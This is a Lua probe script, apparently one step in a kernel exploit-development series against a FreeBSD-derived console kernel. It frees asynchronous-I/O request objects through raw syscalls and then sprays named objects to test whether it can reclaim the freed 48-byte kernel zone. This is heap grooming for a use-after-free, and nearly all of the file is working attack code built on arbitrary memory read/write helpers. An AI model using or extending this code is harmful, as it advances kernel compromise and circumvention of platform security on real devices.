-- CRASH_CLASS: MODERATE
-- PROBE 69p: namedobj-only reclaim of AIO R-object (48B zone)
--
-- R objects are 48B (0x30), likely in a 64B UMA zone. namedobj_create(557)
-- allocates an object whose name is copied in; with a 48B name the copyin
-- buffer may land in the same zone. If not, the namedobj header itself may.
--
-- Strategy: submit+poll+delete AIO to free R → immediately create many
-- namedobjs with KNOWN bytes in the name → read the namedobj back via 540
-- (namedobj_lookup returns handle for matching name) → check if we can
-- detect stale R data by reading the name bytes via memory or via
-- sysctl or by deleting+recreating.
--
-- This probe is simpler than 69d: no child threads, no race. Just testing
-- whether sequential free→spray lands in the same zone.

print("=== PROBE 69p: NAMEDOBJ RECLAIM (no race, zone overlap test) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local function read_624()
    local r = nil
    pcall(function() r = mk(624)(uint64(0)) end)
    return r and N(r) or nil
end

-- /dev/zero for AIO
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- ============================================================
-- [A] BASELINE: 624 delta for namedobj vs AIO
-- ============================================================
print("")
print("[A] Baseline: 624 delta for namedobj and AIO")

local b624 = read_624()
print("  624 start=" .. (b624 or "nil"))

-- Create 256 namedobjs and measure 624
local nobj_handles = {}
for i = 1, 256 do
    local name = put_str(string.format("base%07d", i))
    local ret = nil
    pcall(function() ret = mk(557)(uint64(N(name))) end)
    if ret and sgn(ret) ~= -1 then
        nobj_handles[#nobj_handles + 1] = ret
    end
end
local after_nobj_624 = read_624()
print(string.format("  256 namedobj: 624=%s (delta=%s)", tostring(after_nobj_624),
    (b624 and after_nobj_624) and tostring(after_nobj_624 - b624) or "?"))

-- Delete them all
for _, h in ipairs(nobj_handles) do
    pcall(function() mk(558)(h) end)
end
nobj_handles = {}

-- Create 256 AIO requests and measure 624
local b624_2 = read_624()
local aio_ids = {}
for i = 1, 256 do
    local id = submit_one()
    if id ~= 0 then aio_ids[#aio_ids + 1] = id end
end
local after_aio_624 = read_624()
print(string.format("  256 AIO submit: 624=%s (delta=%s)", tostring(after_aio_624),
    (b624_2 and after_aio_624) and tostring(after_aio_624 - b624_2) or "?"))

-- Poll + delete all
for _, id in ipairs(aio_ids) do poll_one(id) end
for _, id in ipairs(aio_ids) do delete_one(id) end
aio_ids = {}

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] ZONE OVERLAP TEST: AIO free → namedobj spray → 624 check
-- ============================================================
print("")
print("[B] Zone overlap: AIO free -> namedobj spray -> 624")

local ITERS = 20
local overlap_detected = 0

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit + poll + delete 32 AIO IDs (frees 32 R objects of 48B)
    local pre_624 = read_624()
    local ids = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then ids[#ids + 1] = id end
    end
    for _, id in ipairs(ids) do poll_one(id) end
    local post_submit_624 = read_624()
    for _, id in ipairs(ids) do delete_one(id) end
    local post_delete_624 = read_624()

    -- Now spray 64 namedobjs (should reclaim freed R slots if same zone)
    local pre_spray_624 = read_624()
    local spray = {}
    for i = 1, 64 do
        local name = string.format("r%d_%04d", iter, i)
        local np = put_str(name)
        local ret = nil
        pcall(function() ret = mk(557)(uint64(N(np))) end)
        if ret and sgn(ret) ~= -1 then
            spray[#spray + 1] = {handle = ret, name = name}
        end
    end
    local post_spray_624 = read_624()

    -- If namedobj reused R's free slots, we'd see FEWER 624 deltas
    -- (no new slab pages needed because slots from AIO deletion are reused)
    local submit_d = (post_submit_624 and pre_624) and (post_submit_624 - pre_624) or -1
    local delete_d = (post_delete_624 and post_submit_624) and (post_delete_624 - post_submit_624) or 0
    local spray_d = (post_spray_624 and pre_spray_624) and (post_spray_624 - pre_spray_624) or -1

    -- Check handle values for anomalies
    local handle_anom = 0
    for _, s in ipairs(spray) do
        local hv = N(s.handle)
        if hv == 0 or hv >= 0x80000000 then
            handle_anom = handle_anom + 1
        end
    end

    -- Verify namedobjs are alive by looking them up via 540
    local lookup_ok = 0
    for _, s in ipairs(spray) do
        local np = put_str(s.name)
        local ret = nil
        pcall(function() ret = mk(540)(uint64(N(np))) end)
        if ret and sgn(ret) ~= -1 then lookup_ok = lookup_ok + 1 end
    end

    -- Detect overlap: spray_d=0 means no new pages allocated → reused freed slots
    local overlap = spray_d == 0 and submit_d > 0
    if overlap then overlap_detected = overlap_detected + 1 end

    local tag = ""
    if overlap then tag = " *** ZONE OVERLAP ***" end
    if handle_anom > 0 then tag = tag .. " hanom=" .. handle_anom end

    print(string.format("  iter %d: aio_d=%d del_d=%d spray_d=%d spray=%d lookup=%d%s",
        iter, submit_d, delete_d, spray_d, #spray, lookup_ok, tag))

    -- Cleanup spray
    for _, s in ipairs(spray) do
        pcall(function() mk(558)(s.handle) end)
    end
end

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] CROSS-CHECK: alternating AIO+namedobj in same iteration
-- ============================================================
print("")
print("[C] Cross-check: interleaved AIO + namedobj creation")

local pre_c = read_624()
local c_ids = {}
local c_nobjs = {}

for i = 1, 64 do
    if not alive() then break end
    -- Submit one AIO
    local id = submit_one()
    if id ~= 0 then c_ids[#c_ids + 1] = id end
    -- Create one namedobj
    local name = string.format("x%07d", i)
    local np = put_str(name)
    local ret = nil
    pcall(function() ret = mk(557)(uint64(N(np))) end)
    if ret and sgn(ret) ~= -1 then
        c_nobjs[#c_nobjs + 1] = ret
    end
end

local post_c = read_624()
print(string.format("  interleaved: %d AIO + %d nobj, 624 delta=%s",
    #c_ids, #c_nobjs,
    (pre_c and post_c) and tostring(post_c - pre_c) or "?"))

-- If they share a zone, 624 delta should be less than creating them separately
-- (because both pull from the same slab page pool)

-- Cleanup
for _, id in ipairs(c_ids) do poll_one(id) end
for _, id in ipairs(c_ids) do delete_one(id) end
for _, h in ipairs(c_nobjs) do
    pcall(function() mk(558)(h) end)
end

print("")
print("ZONE_OVERLAP_DETECTED=" .. overlap_detected .. "/" .. ITERS)
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69p COMPLETE ===")
